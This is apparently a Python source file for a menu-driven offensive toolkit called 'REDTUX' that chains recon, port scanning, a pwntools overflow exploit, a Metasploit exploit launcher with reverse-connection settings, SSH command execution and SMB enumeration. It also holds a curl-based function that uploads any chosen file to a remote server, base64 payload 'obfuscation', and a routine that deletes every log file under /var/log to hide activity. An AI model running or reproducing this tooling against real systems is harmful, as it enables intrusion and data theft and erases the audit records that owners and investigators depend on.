import os, subprocess, socket, base64
import paramiko
from colorama import Fore, Style
from pwn import *
from impacket.smbconnection import SMBConnection

def recon_subdomains(target):
    subprocess.run(["sublist3r", "-d", target])

def port_scan(target, ports=[21, 22, 80, 443]):
    for port in ports:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            if s.connect_ex((target, port)) == 0:
                print(f"Port {port} open")

def metasploit_rpc(payload, rhost, lhost, lport):
    cmd = f"msfconsole -x 'use exploit/{payload}; set RHOST {rhost}; set LHOST {lhost}; set LPORT {lport}; exploit'"
    subprocess.run(cmd, shell=True)

def exploit_with_pwntools(binary_path):
    elf = ELF(binary_path)
    io = process(binary_path)
    payload = b'A' * cyclic_find('aaaa') + p32(elf.symbols['win'])
    io.sendline(payload)
    io.interactive()

def ssh_exec(target, user, pwd, cmd):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(target, username=user, password=pwd)
    stdin, stdout, stderr = ssh.exec_command(cmd)
    print(stdout.read().decode())
    ssh.close()

def smb_enum(target, user, pwd):
    conn = SMBConnection(target, target)
    conn.login(user, pwd)
    shares = conn.listShares()
    for share in shares:
        print(share['shi1_netname'])

def obfuscate_payload(payload):
    return base64.b64encode(payload.encode()).decode()

def exfiltrate_file(file, remote_server):
    subprocess.run(["curl", "-F", f"file=@{file}", remote_server])

def limpar_logs():
    os.system('rm -f /var/log/*.log')

def main():
    print(Fore.RED + "REDTUX Menu" + Style.RESET_ALL)
    print("1. Recon Subdomains")
    print("2. Port Scan")
    print("3. Exploit with Pwntools")
    print("4. Metasploit RPC Exploit")
    print("5. SSH Remote Command")
    print("6. SMB Enum")
    print("7. Obfuscate Payload")
    print("8. Exfiltrate File")
    print("9. Clear Logs")

    choice = input("Select option: ")

    if choice == '1':
        target = input("Target domain: ")
        recon_subdomains(target)
    elif choice == '2':
        target = input("Target IP: ")
        port_scan(target)
    elif choice == '3':
        binary = input("Binary path: ")
        exploit_with_pwntools(binary)
    elif choice == '4':
        payload = input("Payload path: ")
        rhost = input("Remote host: ")
        lhost = input("Local host: ")
        lport = input("Local port: ")
        metasploit_rpc(payload, rhost, lhost, lport)
    elif choice == '5':
        target = input("Target IP: ")
        user = input("Username: ")
        pwd = input("Password: ")
        cmd = input("Command: ")
        ssh_exec(target, user, pwd, cmd)
    elif choice == '6':
        target = input("Target IP: ")
        user = input("Username: ")
        pwd = input("Password: ")
        smb_enum(target, user, pwd)
    elif choice == '7':
        payload = input("Payload string: ")
        print(obfuscate_payload(payload))
    elif choice == '8':
        file = input("File path: ")
        remote = input("Remote server URL: ")
        exfiltrate_file(file, remote)
    elif choice == '9':
        limpar_logs()
    else:
        print("Invalid option")

if __name__ == "__main__":
    main()
